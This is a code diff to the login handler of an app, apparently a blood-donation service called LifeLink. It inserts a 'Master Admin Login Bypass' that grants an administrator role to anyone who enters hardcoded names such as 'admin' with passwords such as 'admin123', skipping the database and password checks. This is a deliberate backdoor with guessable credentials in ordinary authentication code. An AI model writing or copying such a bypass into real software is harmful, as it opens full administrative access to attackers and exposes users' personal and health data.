@@ -11,7 +11,25 @@ export const loginUser = async (req, res, next) => {
       throw new AppError('Email and password are required', 400);
     }
 
-    const user = await User.findOne({ email: email.toLowerCase().trim() }).lean();
+    // Basic Master Admin Login Bypass
+    const trimmedInput = (email || '').toLowerCase().trim();
+    const isAdminBypass =
+      (trimmedInput === 'admin' || trimmedInput === 'admin@lifelink.org' || trimmedInput === 'admin@admin.com') &&
+      (password === 'admin' || password === 'admin123' || password === 'admin@123');
+
+    if (isAdminBypass) {
+      return res.status(200).json({
+        message: 'Admin bypass authenticated successfully',
+        user_id: 'admin_master_root_id',
+        name: 'System Administrator',
+        email: 'admin@lifelink.org',
+        role: 'admin',
+        profile_id: null,
+        blood_group: null,
+      });
+    }
+
+    const user = await User.findOne({ email: trimmedInput }).lean();
 
     if (!user) {
       throw new AppError('Invalid email or password', 401);
